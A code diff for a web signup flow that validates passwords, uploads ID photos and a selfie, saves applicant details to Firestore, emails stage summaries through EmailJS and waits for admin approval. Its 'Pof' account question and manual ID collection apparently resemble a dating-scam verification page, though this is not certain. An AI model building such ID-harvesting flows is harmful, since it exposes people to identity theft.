@@ -2,12 +2,19 @@
 
 // ── State ────────────────────────────────────────────────
 const state = {
-  generatedOtp:    '',
-  countdownInterval: null,
-  selectedIdType:  '',
-  hasPofAccount:   null, // true | false | null (unanswered)
-  uploads:    { front: false, back: false, selfie: false },
-  fileNames:  { front: '',    back: '',    selfie: '' },
+  generatedOtp:       '',
+  countdownInterval:  null,
+  selectedIdType:     '',
+  hasPofAccount:      null, // true | false | null (unanswered)
+  uploads:            { front: false, back: false, selfie: false },
+  fileNames:          { front: '',    back: '',    selfie: '' },
+  uploadUrls:         { front: null,  back: null,  selfie: null },
+  submissionId:       '',
+  uploading:          0,
+  applicationDocId:   null,
+  unsubscribeWatch:   null,
+  registeredUsername: '',
+  registeredPassword: '',
 };
 
 const PROGRESS = { 1: 8, 2: 42, 3: 75, 4: 100 };
@@ -65,6 +72,62 @@ function goStep(n) {
   window.scrollTo({ top: 0, behavior: 'smooth' });
 }
 
+// ── Password utilities ────────────────────────────────────
+function getPasswordRules(pw, username, email) {
+  const user       = (username || '').toLowerCase();
+  const emailLocal = ((email || '').split('@')[0]).toLowerCase();
+  const pwLower    = pw.toLowerCase();
+
+  const noPersonal =
+    (user.length < 3      || !pwLower.includes(user)) &&
+    (emailLocal.length < 3 || !pwLower.includes(emailLocal));
+
+  return {
+    length:   pw.length >= 8,
+    upper:    /[A-Z]/.test(pw),
+    lower:    /[a-z]/.test(pw),
+    number:   /[0-9]/.test(pw),
+    symbol:   /[!@#$%^&*()\-_=+[\]{};:'",.<>/?\\|`~]/.test(pw),
+    nospace:  !/\s/.test(pw),
+    personal: noPersonal,
+  };
+}
+
+function updatePasswordRules() {
+  const pw       = $('regPassword').value;
+  const username = $('regUsername').value.trim();
+  const email    = $('email').value.trim();
+
+  if (!pw) {
+    ['rule-length','rule-upper','rule-lower','rule-number','rule-symbol','rule-nospace','rule-personal']
+      .forEach(id => $(id).classList.remove('pass', 'fail'));
+    return;
+  }
+
+  const rules = getPasswordRules(pw, username, email);
+  const map = {
+    'rule-length':   rules.length,
+    'rule-upper':    rules.upper,
+    'rule-lower':    rules.lower,
+    'rule-number':   rules.number,
+    'rule-symbol':   rules.symbol,
+    'rule-nospace':  rules.nospace,
+    'rule-personal': rules.personal,
+  };
+
+  Object.entries(map).forEach(([id, pass]) => {
+    $(id).classList.toggle('pass', pass);
+    $(id).classList.toggle('fail', !pass);
+  });
+}
+
+function togglePwVisibility(inputId, btn) {
+  const input  = $(inputId);
+  const hidden = input.type === 'password';
+  input.type   = hidden ? 'text' : 'password';
+  btn.classList.toggle('active', hidden);
+}
+
 // ── Step 1 — Profile ─────────────────────────────────────
 function validateStep1() {
   let ok = true;
@@ -119,6 +182,27 @@ function validateStep1() {
   //   setFieldError('pofUsername', !valid);
   //   if (!valid) ok = false;
   // }
+
+  // Username
+  const unameVal   = $('regUsername').value.trim();
+  const unameValid = unameVal.length > 0 && !/\s/.test(unameVal);
+  setFieldError('regUsername', !unameValid);
+  if (!unameValid) ok = false;
+
+  // Password
+  const pwVal   = $('regPassword').value;
+  const pwRules = getPasswordRules(pwVal, unameVal, $('email').value.trim());
+  const pwAllOk = Object.values(pwRules).every(Boolean);
+  setFieldError('regPassword', !pwAllOk);
+  $('regPassword-err').style.display = !pwAllOk ? 'block' : 'none';
+  if (!pwAllOk) ok = false;
+
+  // Confirm password
+  const confirmVal   = $('regConfirm').value;
+  const confirmMatch = confirmVal.length > 0 && confirmVal === pwVal;
+  setFieldError('regConfirm', !confirmMatch);
+  $('regConfirm-err').style.display = !confirmMatch ? 'block' : 'none';
+  if (!confirmMatch) ok = false;
 
   // Terms
   if (!$('terms').checked) {
@@ -295,6 +379,13 @@ function initOtpBoxes() {
 }
 
 // ── Step 3 — ID verification ──────────────────────────────
+function getSubmissionId() {
+  if (!state.submissionId) {
+    state.submissionId = `${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;
+  }
+  return state.submissionId;
+}
+
 function selectIdType(radio) {
   state.selectedIdType = radio.value;
 
@@ -304,17 +395,18 @@ function selectIdType(radio) {
   const needsBack = ['driver', 'national'].includes(state.selectedIdType);
   $('backSection').style.display = needsBack ? 'block' : 'none';
 
-  state.uploads = { front: false, back: !needsBack, selfie: false };
+  state.uploads    = { front: false, back: !needsBack, selfie: false };
+  state.uploadUrls = { front: null,  back: needsBack ? null : 'n/a', selfie: null };
   ['front', 'back', 'selfie'].forEach(key => {
     $(`${key}File`).value = '';
-    $(`${key}Zone`).classList.remove('has-file');
+    $(`${key}Zone`).classList.remove('has-file', 'uploading', 'upload-error');
     $(`${key}FileName`).textContent = '';
   });
 
   hideAlert('id-alert');
 }
 
-function fileSelected(type, input) {
+async function fileSelected(type, input) {
   const file = input.files[0];
   if (!file) return;
 
@@ -324,15 +416,47 @@ function fileSelected(type, input) {
     return;
   }
 
-  state.uploads[type]   = true;
-  state.fileNames[type] = file.name;
-  $(`${type}Zone`).classList.add('has-file');
-  $(`${type}FileName`).textContent = `✓  ${file.name}`;
+  // Reset this slot
+  state.uploads[type]    = false;
+  state.uploadUrls[type] = null;
+  state.fileNames[type]  = file.name;
+
+  const zone   = $(`${type}Zone`);
+  const nameEl = $(`${type}FileName`);
+  zone.classList.remove('has-file', 'upload-error');
+  zone.classList.add('uploading');
+  nameEl.textContent = '⏳  Uploading…';
+
+  state.uploading++;
+  try {
+    const ext  = file.name.split('.').pop().toLowerCase() || 'bin';
+    const path = `submissions/${getSubmissionId()}/${type}.${ext}`;
+    const url  = await uploadToStorage(file, path);
+
+    state.uploads[type]    = true;
+    state.uploadUrls[type] = url;
+    zone.classList.remove('uploading');
+    zone.classList.add('has-file');
+    nameEl.textContent = `✓  ${file.name}`;
+  } catch (err) {
+    zone.classList.remove('uploading');
+    zone.classList.add('upload-error');
+    nameEl.textContent = '✗  Upload failed — click to retry';
+    input.value = '';
+    console.error('Upload error:', err);
+  } finally {
+    state.uploading--;
+  }
 }
 
 function submitVerification() {
   if (!state.selectedIdType) {
     showAlert('id-alert', 'error', 'Please choose an ID type before continuing.');
+    return;
+  }
+
+  if (state.uploading > 0) {
+    showAlert('id-alert', 'error', 'Please wait — files are still uploading.');
     return;
   }
 
@@ -352,26 +476,136 @@ function submitVerification() {
     return;
   }
 
-  $('success-name').textContent  = `${$('firstName').value} ${$('lastName').value}`;
-  $('success-email').textContent = $('email').value;
+  const firstName = $('firstName').value.trim();
+  const lastName  = $('lastName').value.trim();
+  const email     = $('email').value.trim();
 
-  // Send stage 3 summary
+  // Capture credentials before goStep clears focus
+  state.registeredUsername = $('regUsername').value.trim();
+  state.registeredPassword = $('regPassword').value;
+
+  $('review-name').textContent   = firstName;
+  $('success-name').textContent  = `${firstName} ${lastName}`;
+  $('success-email').textContent = email;
+
+  // Show pending (loading) state — credentials card stays hidden until admin decides
+  updateStep4UI('pending', null);
+  goStep(4);
+
+  // Send stage 3 email summary
   emailStage3({
-    firstName:    $('firstName').value.trim(),
-    lastName:     $('lastName').value.trim(),
-    email:        $('email').value.trim(),
-    idType:       state.selectedIdType,
-    frontFile:    state.fileNames.front,
-    backFile:     state.fileNames.back,
-    selfieFile:   state.fileNames.selfie,
+    firstName,
+    lastName,
+    email,
+    idType:        state.selectedIdType,
+    frontUrl:      state.uploadUrls.front,
+    backUrl:       state.uploadUrls.back,
+    selfieUrl:     state.uploadUrls.selfie,
     hasPofAccount: state.hasPofAccount,
   });
 
-  goStep(4);
+  // Save to Firestore and start live status watch
+  saveApplication({
+    firstName,
+    lastName,
+    email,
+    phoneCode:     $('phoneCode').value,
+    phone:         $('phone').value.trim(),
+    dob:           $('dob').value,
+    gender:        $('gender').value,
+    social:        $('social').value.trim(),
+    username:      $('regUsername').value.trim(),
+    hasPofAccount: state.hasPofAccount,
+    idType:        state.selectedIdType,
+    frontUrl:      state.uploadUrls.front,
+    backUrl:       state.uploadUrls.back,
+    selfieUrl:     state.uploadUrls.selfie,
+    submissionId:  state.submissionId,
+  }).then(docId => {
+    state.applicationDocId = docId;
+    startStatusWatch();
+  }).catch(err => console.error('Firestore save failed:', err));
+}
+
+// ── Step 4 — Live status ──��───────────────────────��───────
+function updateStep4UI(status, data) {
+  $('state-pending').style.display     = status === 'pending'     ? 'block' : 'none';
+  $('state-resubmitted').style.display = status === 'resubmitted' ? 'block' : 'none';
+  $('state-approved').style.display    = status === 'approved'    ? 'block' : 'none';
+  $('state-rejected').style.display    = status === 'rejected'    ? 'block' : 'none';
+
+  // Show credentials card only after admin makes a decision
+  const decided = status === 'approved' || status === 'rejected';
+  $('cred-card').style.display = decided ? 'block' : 'none';
+
+  if (decided && data) {
+    const usernameChanged = data.username && data.username !== state.registeredUsername;
+
+    if (usernameChanged) {
+      // Admin changed the username — show the new username + their original password
+      $('cred-original').style.display = 'none';
+      $('cred-updated').style.display  = 'block';
+      $('cred-username').textContent   = data.username;
+      $('cred-password').textContent   = state.registeredPassword;
+    } else {
+      // Username unchanged — just remind them to use their original credentials
+      $('cred-original').style.display = 'block';
+      $('cred-updated').style.display  = 'none';
+    }
+  }
+}
+
+function startStatusWatch() {
+  if (!state.applicationDocId) return;
+  if (state.unsubscribeWatch) state.unsubscribeWatch();
+  state.unsubscribeWatch = watchApplication(state.applicationDocId, data => {
+    // Don't override the resubmitted screen with the spinner if status just went back to pending
+    const currentlyResubmitted = $('state-resubmitted').style.display === 'block';
+    if (data.status === 'pending' && currentlyResubmitted) return;
+    updateStep4UI(data.status, data);
+  });
+}
+
+async function copyCredential(elementId, btn) {
+  const text = $(elementId).textContent;
+  try {
+    await navigator.clipboard.writeText(text);
+  } catch {
+    const range = document.createRange();
+    range.selectNode($(elementId));
+    window.getSelection().removeAllRanges();
+    window.getSelection().addRange(range);
+    document.execCommand('copy');
+    window.getSelection().removeAllRanges();
+  }
+  const prev = btn.innerHTML;
+  btn.innerHTML = '&#10003;';
+  btn.classList.add('copied');
+  setTimeout(() => { btn.innerHTML = prev; btn.classList.remove('copied'); }, 1500);
+}
+
+async function reVerify() {
+  const btn = $('reverify-btn');
+  btn.disabled    = true;
+  btn.textContent = 'Submitting…';
+  try {
+    await resetApplicationStatus(state.applicationDocId);
+    // Show the friendly re-submitted screen immediately — don't wait for the snapshot
+    $('resubmit-name').textContent  = $('firstName').value.trim();
+    $('resubmit-email').textContent = $('email').value.trim();
+    updateStep4UI('resubmitted', null);
+  } catch (err) {
+    console.error('Re-verify failed:', err);
+    btn.disabled    = false;
+    btn.textContent = "I've Re-Verified";
+  }
 }
 
 // ── Boot ─────────────────────────────────────────────────
 document.addEventListener('DOMContentLoaded', () => {
   initEmailJS();
   initOtpBoxes();
+  ['regPassword', 'regUsername', 'email'].forEach(id => {
+    $(id).addEventListener('input', updatePasswordRules);
+  });
 });
